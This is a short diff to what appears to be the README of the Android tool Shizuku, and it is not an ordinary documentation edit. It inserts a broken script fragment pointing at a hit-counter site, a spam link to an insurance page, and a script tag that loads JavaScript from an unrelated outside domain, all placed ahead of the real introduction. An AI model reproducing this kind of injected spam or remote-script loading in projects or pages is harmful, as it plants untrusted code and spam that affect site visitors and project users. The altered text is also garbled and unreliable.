@@ -1,4 +1,5 @@
-# Introduction
+https://free-hit-counters.net/count/j0k9"></script><br>
+ <a href='https://www.versicherungen.at/eigenheimversicherung/'>Eigenheimversicherung Haus</a> <script type='text/javascript' src='https://whomania.com/ctr?id=10cdce27041d097b41d36b761563815036f36722'></script># Introduction
 
 Shizuku can help normal apps uses system APIs directly with adb/root privileges with a Java process started with app_process.
 
